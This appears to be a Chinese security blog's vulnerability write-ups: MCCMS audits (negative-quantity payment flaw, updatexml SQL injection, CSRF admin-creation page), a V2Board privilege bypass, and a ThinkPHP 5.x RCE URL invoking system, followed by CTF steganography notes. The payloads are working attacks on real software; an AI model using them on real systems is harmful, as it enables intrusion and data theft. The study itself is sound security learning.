&#125;\n\n我们实现月票反向充值金币的前提绕过就算这个对金币数量是否充足的绕过，$cion中rmb是默认大于Pay_Rmb_Min这个全局变量值为1，而Pay_Rmb_Cion也是默认为10而$user[&#39;cion&#39;]是我们自带的开始金币数，其中我们能控制得参数就只有rmb，但其实还有num。\n当我们购买1张月票数时，rmb为￥1，但当我们购买-1张月票时呢，因为rmb为真，已经通过了其判断，但是当num计算总金额时，并没有对num值的逻辑性进行判断，因此&#x3D;&#x3D;&gt;当type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion【花费rmb=1*10等价金币买月票，也就是花费100金币买10张月票】改成type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion【花费rmb=1*(-10)等价月票，也就是花费10月票买100金币，相当于花-100金币，买-10张的月票\n\n\n\n\n\n\n\n\n\n金币&#x3D;金币-(-10)\n  月票&#x3D;月票+(-10)\n漏洞利用先给我的账户修改一下金币数\n\n然后购买月票抓包看看数据\n\n\n\n\n\n\n\n\n\n\n\ntype=ticket&amp;rmb=1&amp;day=30&amp;num=1&amp;pay=cion#可以看到我们的购买数据完全显示出来type:购买的商品类型rmb:花费金额day:购买物品时限num:购买数量pay:支付方式\n先试试修改一下购买数量\n【金币10000，购买1张月票花10金币，应该还剩9990】\n\n【金币10000，购买10张月票花100金币，应该还剩9900】\n\n然后我们再看看我们的剩余金额\n\n发现扣了200金币（应该是不小心发了两次包）\n【还剩9800】\n虽然没有实现我们的目的，既然在我们金额能承受范围内可以，那么试试超过我们金额以外的呢\n\n\n发现显示金币不够，既然正常的数据不行，那么我们把数量改成负数呢\n\n\n居然购买成功？\n\n我们发现我们的月票数减少了，但是金币数增加了，而且月票数为负数，明显是有问题的\n在购买记录中，我们发下确实也有记录\n\n而获取金币的方式本来应该是通过rmb支付\n\n但是这里通过简单的修改月票数为负数，即可反向增加金币数量，且没有上限制\n这里我又把type和pay两者交换\n\n\n发现依旧购买成功，还显示购买10金币，但是月票数并没有变化，而金币却减少了，应该是月票转金币不符合逻辑，但是发的请求包中的语句符合充值语句，于是按照语法，扣除了num数量的金币\n\n当我又改成且修改rmb改成1000\n\n\n在交易记录中显示增加了10000金币，但是实际金币是在减少\n\n这是因为不符合充值逻辑\n\n\n\n\n\n\n\n\n\n危害通过该漏洞，即可导致金币、月票、vip三者可以无限制\n修复建议\n\n\n\n\n\n\n\n\n该漏洞的形成的根本原因在于在sys&#x2F;apps&#x2F;controllers&#x2F;api&#x2F;Pay.php中1.对客户端用户可控参数的限制不牢，考虑不全，2.对于负数的清况，3.以及对不合逻辑的支付方式的判断不够\n建议1.对客户端可控参数进行加密，让用户无法修改其值2.并且对参数的合理性以及逻辑性加强判断，完善整体代码逻辑，加强不同参数之间的联系，以及参数变化前后的逻辑性3.最好不要让用户能对发送到服务器的数据进行修改或控制\n2.SQL注入漏洞代码分析+漏洞利用这里利用了Acunetix对站点扫描，发现了在主页存在高危的SQL漏洞\n\n发请求包，后发现其响应包的结果为数据库报错\n\n&lt;h1&gt;A Database Error Occurred&lt;/&lt;h1&gt;A Database Error Occurred&lt;/h1>\ndiv id=\"body\">\n\tp>\n              Error Number: 1064\n          p>\n          p>\n     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1\n          p>\n          p>\n              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&#039) order by addtime desc\n              #发现1&#x27;被插入in()中\n          p>\n          p>\n              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php\n          p>\n          p>\n          Line Number: 38\n          p>\n\n于是尝试再in()中能否实现闭合并执行恶意sql语句\n但是在源码中对sql语句有一定过滤\n#sys/apps/user/Category.php\ndefined(&#x27;BASEPATH&#x27;) OR exit(&#x27;No direct script access allowed&#x27;);\nclass Category extends Mccms_Controller &#123;\n\n\tpublic function __construct()&#123;\n\t\tparent::__construct();\n\t&#125;\n\n    //智能检索\n    public function index() &#123;\n        $uri = $this->uri->uri_string();\n        $n = strpos($uri,&#x27;/index&#x27;) !== false ? 3 : 2;\n        $arr = safe_replace($this->uri->uri_to_assoc($n));\n        echo $this->tpl->category($arr);\n\t&#125;\n&#125;\n\n跟进safe_replace\n#sys/apps/helpers/common_helper.php\n//SQL过滤\nfunction safe_replace($string)&#123;\n\tif(is_array($string)) &#123;\n\t\tforeach($string as $k => $v) &#123;\n\t\t\t$string[safe_replace($k)] = safe_replace($v); \n\t\t&#125;\n\t&#125;else&#123;\n\t\tif(!is_numeric($string))&#123;\n\t\t\t$string = str_replace(&#x27;%20&#x27;,&#x27;&#x27;,$string);\n            /*   %20可以用+代替   */\n\t\t\t$string = str_replace(&#x27;%27&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;%2527&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(\"&#x27;\",&#x27;&#039;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;\"&#x27;,&#x27;&quot;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;;&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;*&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;,&#x27;&lt;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;>&#x27;,&#x27;&gt;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;\\\\&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;%&#x27;,&#x27;\\%&#x27;,$string);\n\t\t\t$string = str_encode($string);\n\t\t&#125;\n\t&#125;\n\treturn $string;\n&#125;\n\n我们先简单构造一个\nGET /index.php/book/category/order/addtime/pay/1/finish/1/list/1)+order+by+5%23\n\n发现报错\n从\np>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&#039) order by addtime descp>\n变成\np>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;p>\n\n由符号报错，变成命令报错，看来我们的sql命令在这个构造中是可以执行的\n\n通过order by，判断出当前列数只有1列\n\n\n此处的注入点代码\n&#125;elseif($k == &#x27;list&#x27;)&#123; &#125;elseif($k == &#x27;list&#x27;)&#123; //分类\n                   $title[] = $data[&#x27;title&#x27;] = getzd(&#x27;book_class&#x27;,&#x27;name&#x27;,$v);\n                   if((int)$v > 0)&#123;\n                       $cids = getcid($v);\n                       if(!is_numeric($cids))&#123;\n                           $sql .= \" and cid in(\".$cids.\")\";\n                       &#125;else&#123;\n                           $sql .= \" and cid=\".$cids;\n                       &#125;\n                   &#125;\n\n$cid就是引起sql注入的参数点\n跟进getcid\n//解析多个分类ID  如 cid=1,2,3,4,5,6\nfunction getcid($CID,$type=&#x27;class&#x27;,$zd=&#x27;fid&#x27;)&#123;\n\t$ci = &get_instance();\n\tif(!empty($CID))&#123;\n\t\t$ClassArr=explode(&#x27;,&#x27;,$CID);\n\t\tfor($i=0;$icount($ClassArr);$i++)&#123;\n\t\t\t$sql=\"select id from \".Mc_SqlPrefix.$type.\" where \".$zd.\"=&#x27;$ClassArr[$i]&#x27;\";//sql语句的组织返回\n\t\t\t$result=$ci->db->query($sql)->result();\n\t\t\tif(!empty($result))&#123;\n\t\t\t\tforeach ($result as $row) &#123;\n\t\t\t\t\t$ClassArr[]=$row->id;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t\t$CID=implode(&#x27;,&#x27;,$ClassArr);\n\t\t&#125;\n\t&#125;\n\treturn $CID;\n&#125;\n\n尝试后发现无法进行联合注入\n只能试试报错注入或者盲注\n盲注试了试发现是无法得到反应的\n于是我试了试报错注入\nGET /index.php/book/category/order/addtime/pay/1/finish/1/list/1)+and+updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%23\n\n\n果然是报错注入，我们得到了我们想要的数据，虽然因为报错函数限制了显示数据字符个数，用substring即可\nGET /index.php/book/category/order/addtime/pay/1/finish/1/list/1)+and+updatexml(1,concat(0x7e,substring(@@datadir,15),0x7e),1)%23\n\n\n最后得到\n数据库名:mccms\n数据库管理员名字:root\n数据库路径: D:\\phpstudy_pro\\Extensions\\MySQL8.0.12\\data\\\n\n修复建议\n\n\n\n\n\n\n\n\n1.对代入sql查询语句的参数进行严格过滤2.减少用户对传入sql查询的中参数的直接控制的机会3.对一些数据函数禁止用，或者少用4.最好不要直接把用户数据带入数据库中进行查询\n3.后台一处安全漏洞\n\n\n\n\n\n\n\n\n后台漏洞一般猜测为登录存在sql注入，模板注入，越权，命令执行,csrf等等\n代码分析由于之前修复过sql注入，所以在这里的可能性就很少了，于是对其他漏洞进行测试\n不过，抓包过程中发现其信息皆是以明文形式发送\n所以猜测存在csrf\n【先进行了漏洞测试】\n以此处为例\n对csrf实现控制管理员删除用户代码分析\n#sys/apps/controllers/admin/User.php\n//删除会员\n\tpublic function del($id=0)&#123;\n \t    $id = (int)$id;\n \t    if($id == 0)&#123;\n \t    \t$ids = $this->input->get_post(&#x27;id&#x27;,true);\n            /*get_post先查看GET数据中的id，再查看POST数据中的id\n            这里也是我们实现csrf的关键处，\n            这里的id以明文显示，以明文读取，那么只要修改明文，任意的id都可以实现进行后续删除操作\n            如果前端对明文数据加密，再在这里比较匹对后，再传参可能更安全*/\n            \n \t    \t$ids = implode(&#x27;,&#x27;,$ids);\n            /*implode —用字符串连接数组元素*/\n \t    \tif(is_numeric($ids) || preg_match(&#x27;/^([0-9]+[,]?)+$/&#x27;, $ids))&#123;\n\t\t\t\t$id = $ids;\n\t\t\t&#125;\n \t    &#125;\n \t    if(empty($id)) get_json(&#x27;ID不能为空~!&#x27;);\n \t    $arr = explode(&#x27;,&#x27;, $id);\n \t    foreach ($arr as $_id) &#123;\n \t    \t//删除头像地址\n\t\t\t$pic = getzd(&#x27;user&#x27;,&#x27;pic&#x27;,$id);\n\t\t\t$this->load->model(&#x27;tongbu&#x27;);\n\t\t\t$this->tongbu->del($pic);\n\t\t\t//删除记录\n    \t\t$this->mcdb->get_del(&#x27;user&#x27;,$_id);\n \t    &#125;\n\t\t$arr[&#x27;msg&#x27;] = &#x27;恭喜您，删除成功~!&#x27;;\n\t\t$arr[&#x27;url&#x27;] = links(&#x27;user&#x27;);\n\t\tget_json($arr,1);\n\t&#125;\n\n\n\n漏洞利用CSRF此处以管理员可以删除用户为例\n这是在删除用户时进行的抓包数据，发现其信息皆以明文显示，只要修改id数据就可以达到删除指定用户的目的\n\n先创建2个用户，id为3，4\n\n然后根据我们的抓包数据构造一个钓鱼的链接\nclick me  \n#这里的id以GET方式提交也可以\n\n\n保持登录的状态点击\n\n也试了试4\n\n发现也显示成功\n这是我们返回后台查看用户信息\n\n发现只有ID=1的用户了\n我们的csrf也就攻击成功了\n甚至添加后台管理员账户也是可以\n\n\n构造钓鱼链接\n&lt;!DOCTYPE &lt;!DOCTYPE html>\nhtml lang=\"en\">\n\nhead>\n    meta charset=\"UTF-8\">\n    meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    title>MCCMS POSTtitle>\nhead>\n \nbody>\n    button onclick=\"btn2()\">MCCMS CSRFbutton>\n\n    form action=\"http://127.0.0.3/admin.php/sys/save\"  method=\"post\" id=\"test\">\n        input style=\"display:none;\" type=\"text\" name=\"name\" value=\"hacker\">br>\n        input style=\"display:none;\" type=\"text\" name=\"nichen\" value=\"Ttoc\">br>\n\t\tinput style=\"display:none;\" type=\"text\" name=\"pass\" value=\"123456\">br>\n\t\tinput style=\"display:none;\" type=\"text\" name=\"id\" value=\"0\">br>\n    form>\n    script>\n        function btn2() &#123;\n            const f = document.getElementById(&#x27;test&#x27;);\n            f.submit();\n        &#125;\n    script>\nbody>\n\nhtml>\n\npost方式以火狐浏览器提交\n\n提交成功，成功向后台添加了我们的恶意用户\n\n\n\n\n\n\n\n\n\n\n除此以外\n其他管理员可以控制的操作，比如修改用户金币数，月票数等等，因为都是以明文提交，都可以用csrf实现\n\n修复建议\n\n\n\n\n\n\n\n\n此处我们发现用户凭据发现以明文形式发送那么中间就可能被第三方获取并利用，所以建议\n1.对数据进行进一步的加密2.可以在HTTP请求中加入一个随机产生的token，并在后台服务器端验证token，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求3.验证请求的referer值4.对参数传入方式和验证的过程严格控制，以免传入外来恶意数据，导致信息泄露或丢失5.用户二次验证，对于这种不可逆操作执行前进行比如手机验证码之类的第二次验证，不以cookie为唯一验证\n4.作家发布漫画小说命令执行漏洞(复现失败)代码分析+漏洞利用\n\n\n\n\n\n\n\n\n猜测1.发布木马文件，导致命令执行2.一些客户端可以修改的参数，被命令执行函数包含且执行\n但根据的2.5.8更新文档\n\n\n\n\n\n\n\n\n\nMccms漫画小说系统-v2.5.8更新详情1.修复了SQL注入高危漏洞2.修复了木马伪装图片上传漏洞\n所以如果通过漫画图片上传木马，大概率是行不通了\n先注册完信息，再后台完成作者认证\n\n\n漫画但是也可以试试上传图片马，看看它怎么修复的\n这里限制了文件类型，可以试试能不能绕过\n\n\n直接上传脚本文件会被拦截\n\n上传图片🐎的话 ，会显示非法图片\n#sys/apps/controllers/author/Chapter.php\n        if(!$this->upload->do_upload(&#x27;image&#x27;))&#123;\n            $msg = $this->upload->display_errors();\n            get_json($msg);\n        &#125;else&#123;\n            $arr = $this->upload->data();\n            $img_path_file = $arr[&#x27;full_path&#x27;];\n            $res = checkPicHex($img_path_file);\n           /*关键在这里，让对我们上传图片的内容进行了检查导致无法上传*/\n            if($res == 1) get_json(&#x27;非法图片&#x27;);\n\n跟进函数\n#sys/apps/helpers/common_helper.php\n//检查上传图片是否包含木马\nfunction checkPicHex($file) &#123;\n    if(file_exists($file)) &#123;\n        $resource = fopen($file,&#x27;rb&#x27;);\n        $fileSize = filesize($file);\n        fseek($resource, 0);//把文件指针移到文件的开头\n        if($fileSize > 512)&#123; // 若文件大于521B文件取头和尾\n            $hexCode = bin2hex(fread($resource, 512));\n            /*fread —二进制安全文件读取*/\n            fseek($resource, $fileSize - 512);//把文件指针移到文件尾部\n            $hexCode .= bin2hex(fread($resource,512));\n            /*bin2hex —将二进制数据转换为十六进制表示*/\n        &#125; else &#123; // 取全部\n            $hexCode = bin2hex(fread($resource, $fileSize));\n        &#125;\n        fclose($resource);\n        if(preg_match(\"/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is\",$hexCode))\n        /*匹配16进制中一句话木马中特征编码\n        过滤\n        \n        \n        ()\n        */\n        &#123;\n        \t//删除文件\n        \tunlink($file);\n            return 1;\n        &#125;else&#123;\n            return 0;\n        &#125;\n    &#125; else &#123;\n        return -1;\n    &#125;\n&#125;\n/*也就是把图片以二进制方式读取的数据再进行十六进制转化，最后进行正则匹配过滤，看来绕过确实不容易*/\n\n正常上传图片，\n\n成功\n\n而且还回显了图片上传的路径\n试试能不能访问\n\n发现是可以访问这个目录下的图片文件的\n但当我在这个路径目录直接放了脚本文件，再访问时\n\n发现被阻止了，也就是apchae在这个图片存储目录设置了脚本文件的访问权限禁止，那么就无法利用在这个目录下的脚本文件\n所以，要么修改上传的路径，比如到网站的自身脚本目录下，进行访问执行\n\n小说抓包小说，发现绕过了字数过少的限制，而且也绕过了小说后台审核\n\n我们抓包修改的内容没有经过后台直接到了存储目录\n\n后面发现是由于源码中，对签约用户自动审核通过\n#sys/apps/controllers/author/Bookchapter.php\n            //判断签约，签约用户自动审核\n            $signing = getzd(&#x27;user&#x27;,&#x27;signing&#x27;,$uid);\n            $data[&#x27;yid&#x27;] = $signing == 1 ? 0 : 1;\n            $data[&#x27;bid&#x27;] = $bid;\n            $data[&#x27;addtime&#x27;] = time();\n\n其中主要对动漫和小说名字，以及评论处还进行了sql注入限制\n\n#sys/apps/helpers/common_helper.php\n//SQL过滤\nfunction safe_replace($string)&#123;\n\tif(is_array($string)) &#123;\n\t\tforeach($string as $k => $v) &#123;\n\t\t\t$string[safe_replace($k)] = safe_replace($v); \n\t\t&#125;\n\t&#125;else&#123;\n\t\tif(!is_numeric($string))&#123;\n\t\t\t$string = str_replace(&#x27;%20&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;%27&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;%2527&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(\"&#x27;\",&#x27;&#039;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;\"&#x27;,&#x27;&quot;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;;&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;*&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;,&#x27;&lt;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;>&#x27;,&#x27;&gt;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;\\\\&#x27;,&#x27;&#x27;,$string);\n\t\t\t$string = str_replace(&#x27;%&#x27;,&#x27;\\%&#x27;,$string);\n\t\t\t$string = str_encode($string);\n\t\t&#125;\n\t&#125;\n\treturn $string;\n&#125;\n\n也对一定时间内更新数也有限制，所以如果想利用签约作者账号爆库还是有点难\n#sys/apps/controllers/author/Bookchapter.php   \n           //判断五分钟内更新数量\n           $time = time()-300;\n           $mnum = $this->mcdb->get_nums($table,array(&#x27;bid&#x27;=>$bid,&#x27;addtime>&#x27;=>$time));\n           if($mnum > 5) get_json(&#x27;系统检测到你有非法暴库行为~！&#x27;);\n\n\n但是其对上传文件进行都默认为txt文件\n而且对类似&lt;&gt;特殊符号也进行了编译\n\n\n稍微看看小说文本文件生成的代码流程\n#sys/apps/controllers/author/Bookchapter.php\n        //写入小说到TXT文本\n        get_book_txt($bid,$id,$text);\n\n        $arr[&#x27;msg&#x27;] = &#x27;恭喜您，操作成功~!&#x27;;\n        $arr[&#x27;url&#x27;] = get_url(&#x27;author/bookchapter/index/&#x27;.$bid);\n        get_json($arr,1);\n/*这是把作者文章写入存储目录的代码*/\n\n跟进 get_book_txt函数\n#sys/apps/helpers/common_helper.php\n//获取小说txt文本\nfunction get_book_txt($bid,$zid,$text=&#x27;&#x27;)&#123;\n\t$txt_file = FCPATH.&#x27;caches/txt/&#x27;.$bid.&#x27;/&#x27;.md5($zid.Mc_Book_Key).&#x27;.txt&#x27;;\n    /*这里修改了文本名字*/\n\tif(!empty($text))&#123;\n\t\treturn write_file($txt_file, $text);\n\t&#125;else&#123;\n\t\tif(!file_exists($txt_file)) return false;\n        /*这里就是对改文章是否重复的判断*/\n\t\treturn file_get_contents($txt_file);\n\t&#125;\n&#125;\n\n再跟进write_file函数\n看看我们的文本是怎么写入文件的\n//写文件\nfunction write_file($path, $data, $mode = FOPEN_WRITE_CREATE_DESTRUCTIVE)&#123;\n\t$dir = dirname($path);\n\tif(!is_dir($dir)) mkdirss($dir);\n\tif(!$fp = @fopen($path,$mode)) return FALSE;\n\tflock($fp, LOCK_EX);\n\tfwrite($fp, $data);\n\tflock($fp, LOCK_UN);\n\tfclose($fp);\n\treturn TRUE;\n&#125;\n\n原来是直接用fwrite写入文件，而字符开始就被html转义了，所以写入的结果肯定是转义后的结果\n猜测可能是存在参数变量可以被代码执行函数覆盖，再通过与其他参数结合，实现命令执行\n\n测试完成\nV2Board  v1.6.1 越权访问漏洞这是在某次比赛遇到的一道题，只拿了题目专门来记录这个漏洞，并没下载代码测试\n漏洞描述V2board面板 Admin.php 存在越权访问漏洞，由于部分鉴权代码于v1.6.1版本进行了修改，鉴权方式变为从Redis中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限\n也就是说它是从缓存中来判断权限，一旦判断成功，就可以以admin身份去访问其他不可访问的敏感内容，比如admin的密码等等\n漏洞代码分析代码位置：app/Http/Middleware/Admin.php\n\n这里的代码就是判断redis缓存中是否存在authorization，如果存在就允许调用admin的接口，所以一旦存在\nauthorization就可以调用该接口，但是并没用进一步判断authorization中是否属于admin\n主要要通过两次逻辑实现验证，一个是存在 header 中的 authorization 参数，再一个是校验 authorizations 是否存在于Redis缓存中的\n在返回包数据中，\n\n这里可以看到，这里在登录时会返回token，auth_data\n而auth_data和authorization两个格式都是一样的base64_encode(&quot;username:password&quot;)\n但是一个普通用户，一个管理员用户，这里就可能存在逻辑漏洞越权\n漏洞测试先进行注册一个普通权限的\n\n账号：123@qq.com\n密码：123456789\n\n在登录时进行抓包\n返回包会返回我们的token和auth_data\n\n同时 auth_data 会缓存于 Redis 中\n但是还是需要把这个auth_data写进authorization\n如果不写入直接访问/admin就会弹出禁止，因为在缓存中普通用户的数据是以auth_data，\n\n所以通过下面访问/api/v1/user/info，当然访问其他位置也可以，只要能把authorization参数把普通用户数据添加到请求体中，并且成功发送\n从而普通用户的数据也以authorization参数形式保存到redis缓存中去了\n\n如何我们就可以访问admin才可以访问的信息\n比如/api/v1/admin/user/fetch，这就是以admin查看访问user的信息\n\n成功访问\n并且得到email,password,token等信息\n\n测试完成\nThinkPHP 5.x 远程命令执行漏洞\n\n\n\n\n\n\n\n\n好老的洞，最近在一个学弟发的题目中看的，虽然做出了，但是thinkphp做的太少了还是的找点来打打(审Java才是正道\n漏洞影响范围\n\n\n\n\n\n\n\n\n5.x &lt; 5.1.31\n5.x &gt;&#x3D; 5.0.23\n漏洞复现环境\n\n\n\n\n\n\n\n\nthinkphp ：V5.1.29\nApache：V2.4.39\nphp：V5.6.9nts\n\n漏洞代码分析先看官方更新补丁，\n\n\n\n\n\n\n\n\n\n5.1.x修复\n5.0.x修复\n两者修复区别不大，5.1.x只有比5.0.x多了有如下图的70line的那行代码\n\n可以看到修复后的代码对controller进行了严格过滤，而在之前的代码中是直接读取控制器名字，\n$controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig($controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig(&#x27;default_controller&#x27;));\n\n\n既然这么严格 过滤，所以猜测$controller就是命令执行漏洞的关键或者是命令执行函数的参数，全局查找命令执行执行函数的位置\n正好就在同一个文件中，\n public function exec( public function exec()\n    &#123;\n        // 监听module_init\n        $this->app[&#x27;hook&#x27;]->listen(&#x27;module_init&#x27;);\n\n        try &#123;\n            // 实例化控制器\n            $instance = $this->app->controller($this->controller,\n                $this->rule->getConfig(&#x27;url_controller_layer&#x27;),\n                $this->rule->getConfig(&#x27;controller_suffix&#x27;),\n                $this->rule->getConfig(&#x27;empty_controller&#x27;));\n\n            if ($instance instanceof Controller) &#123;\n                $instance->registerMiddleware();\n            &#125;\n        &#125; catch (ClassNotFoundException $e) &#123;\n            throw new HttpException(404, &#x27;controller not exists:&#x27; . $e->getClass());\n        &#125;\n\n        $this->app[&#x27;middleware&#x27;]->controller(function (Request $request, $next) use ($instance) &#123;\n            // 获取当前操作名\n            $action = $this->actionName . $this->rule->getConfig(&#x27;action_suffix&#x27;);\n\n            if (is_callable([$instance, $action])) &#123;\n                // 执行操作方法\n                $call = [$instance, $action];\n\n                // 严格获取当前操作方法名\n                $reflect    = new ReflectionMethod($instance, $action);\n                $methodName = $reflect->getName();\n                $suffix     = $this->rule->getConfig(&#x27;action_suffix&#x27;);\n                $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;\n                $this->request->setAction($actionName);\n\n                // 自动获取请求变量\n                $vars = $this->rule->getConfig(&#x27;url_param_type&#x27;)\n                ? $this->request->route()\n                : $this->request->param();\n                $vars = array_merge($vars, $this->param);\n            &#125; elseif (is_callable([$instance, &#x27;_empty&#x27;])) &#123;\n                // 空操作\n                $call    = [$instance, &#x27;_empty&#x27;];\n                $vars    = [$this->actionName];\n                $reflect = new ReflectionMethod($instance, &#x27;_empty&#x27;);\n            &#125; else &#123;\n                // 操作不存在\n                throw new HttpException(404, &#x27;method not exists:&#x27; . get_class($instance) . &#x27;->&#x27; . $action . &#x27;()&#x27;);\n            &#125;\n\n            $this->app[&#x27;hook&#x27;]->listen(&#x27;action_begin&#x27;, $call);\n\n            $data = $this->app->invokeReflectMethod($instance, $reflect, $vars);\n\n            return $this->autoResponse($data);\n        &#125;);\n\n        return $this->app[&#x27;middleware&#x27;]->dispatch($this->request, &#x27;controller&#x27;);\n    &#125;\n&#125;\n\n\n\n这里通过$this-&gt;app-&gt;controller来实现实例化控制器，从而调用这个实例的方法。\n为了找到控制器是如何实现命令执行跟进，app--&gt;constroller，定义在App.php中，\n\n可以看到在实例中的大多参数，都被parseModuleAndClass 处理，并解析为$module和$class，尤其根据更新文档中控制器名字$this-&gt;controller，也就是上图中的参数$name，最有可能这里发生了一些变化\n// 实例化控制器\n$instance = $this->app->controller($this->controller,\n   $this->rule->getConfig(&#x27;url_controller_layer&#x27;),\n   $this->rule->getConfig(&#x27;controller_suffix&#x27;),\n   $this->rule->getConfig(&#x27;empty_controller&#x27;));\n\n跟着看看$module和$class有什么作用，\n在上图中$class被用来测试类是否存在，如果存在就进行实例化，如下图两个函数\n\n\n而$module在这里起到一个生成动态命名空间的作用\n\n然后，开始跟进parseModuleAndClass方法，\n\n可以发现，当 $name 以反斜线 \\ 开始时直接将其作为类名。利用命名空间的特点，如果可以控制此处的 $name（即路由中的 controller 部分），那么就可以实例化任何一个类。\n但是要传参进去，就要看tp的url解析配置，\n route/Rule.php中配置了如何解析中的路由信息，\n\n就是用/将$url分割开，\n而$url是从Request::path()中获取，那直接修改请求url即可，那就有思路了。\n只是$url这个参数是如何获取的呢？\n在这里可以看到，pathinfo()会进行读取请求中的GET参数$this*-&gt;config[&#39;var_pathinfo&#39;]\n\n而 var_pathinfo 的默认配置为 s，于是只需要传入参数s，对其进行修改即可，即可达到传参修改的目的\n\n漏洞构造payload以及复现根据上面代码分析，实际上就是实例化类，如何调用就行了\n于是随便找个有执行函数或者恶意函数类实例化即可，记得加上反斜线 \\ ，让其name被代码认为是类进行实例化即可\n底下我就用实例化app中的invokefunction调用call_user_func_array，用system函数执行dir\nhttp:http://127.0.0.1/tp5/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir\n\n\n测试完成\n","slug":"CMS-Test","date":"2022-11-22T05:36:05.907Z","categories_index":"网络安全学习","tags_index":"漏洞","author_index":"Ttoc"},{"id":"f7e30af70c63074db116eb518d0788b0","title":"密码+杂项题简单记录","content":"只会web，得分太少，还是搞点密码和杂项来提高一下\n\n\n1.一般加密直接用kali的\n\nciphey -t \"xxx\"\n\n2.SSTV图像声音&#x2F;Audacity波形声音用win10上\n\nMMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】\n\nAudacity解析声音波形得到波形图像从而得到flag\n\n3.加密压缩包*1）win10用win10工具爆破压缩包密码\n2）kalikali john爆破压缩包\nzip2john 压缩包的名字.zip >> passwdhash.txt\n\n4.图片隐写1）win10利用Stegsolve解析图片隐写内容\n*2）kalizsteg\nzsteg 图片\n\n5.零宽字符隐写http://330k.github.io/misc_tools/unicode_steganography.html\n我们开始看这个内容是没有什么问题的，但是底下的\n第7行，第204列\n说明里面有其他我们无法看到的字符存在\n\n我们可以利用vim读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符\n\n这些就是零宽字符\n那么我们如何从中读取信息呢\n这里就需要下面这个网站的，对文本的零宽字符加密和零宽字符解密功能\nhttp://330k.github.io/misc_tools/unicode_steganography.html\n\n先选好出现的字符类型\n\n然后\n\n得到隐藏内容\n86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb\n\n用ciphey 得到flag\n\n6.隐藏秘密(flag)到图片、音乐win10Silenteye\n\n把图片或者声音拖入其中\n\n然后执行Decode\n\n得到加密信息\n用ciphey 得到flag\n\n7.小游戏win10CE修改器，懂得都懂\n8.Java类的利用jd-gui对java反汇编，看看有没有信息\n9.二维码1）缺少定位点\n利用ps把两者拼接起来就可以了\n10.分离图片中的隐藏文件原文链接\n1）图片分析:如图为CTF题目中一个隐藏文件的图片\n首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。\n使用方法：binwalk + 文件路径&#x2F;文件名\nbinwalk 1.jpg\n\n执行命令后，binwalk就会自动分析这个jpg文件：\n\n从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。\n2、如何分离：在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：\n2.1、binwalk 分离：还是使用binwalk工具，使用dd命令分离出隐藏文件：\ndd if=1.jpg of=1.zip skip=48221 bs=1\n\n解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，\nbs设置每次读写块的大小为1字节\n执行后会得到一个1.zip文件。\n\n2.2、foremost 工具分离：foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：\napt-get install foremost\n\n\nLinux下分离文件的命令为：\nforemost 1.jpg\n\n\n执行命令后，foremost会生成output目录存放分离出的文件。\nWin下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。\n\n2.3、hex编辑器分离：hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。\n一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。\n经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 